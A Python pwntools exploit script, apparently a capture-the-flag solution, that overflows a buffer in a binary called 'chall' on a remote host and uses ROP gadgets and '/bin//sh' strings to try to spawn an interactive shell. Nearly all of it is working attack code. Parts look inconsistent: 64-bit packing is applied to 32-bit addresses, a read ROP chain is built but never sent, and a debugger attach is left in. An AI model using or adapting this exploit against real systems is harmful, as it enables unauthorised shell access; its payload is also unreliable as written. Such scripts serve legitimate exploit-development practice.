#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')
context.terminal = ['alacritty', '-e', 'sh', '-c']
host = args.HOST or '35.238.225.156'
port = int(args.PORT or 1004)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
init-pwndbg
set follow-fork-mode parent
break *main
'''.format(**locals())

# -- Exploit goes here --

io = start()
offset = 17 # pattern = aaaf
padding = 'aaaabaaacaaadaaae'
syscall  = 0x000000000806ac6d
call_system = 0x8049dbc
pop_eax_ret = 0x00000000080ae6e6
pop_edx_pop_ebx_ret = 0x000000000805ec95
pop_ecx = 0x08064081
pop_esp = 0x00000000080ae6a6
bss = 0x80e05c0
io.recv()

read_rop = flat([

    pop_ecx,
    bss,
    pop_eax_ret,
    0x03,
    0x0,
    0xf,
    syscall

])
payload = padding + p64(pop_esp) + "/bin//sh" + p64(call_system) + "/bin//sh"*10
gdb.attach(io, gdbscript=gdbscript)
io.sendline(payload)

io.interactive()

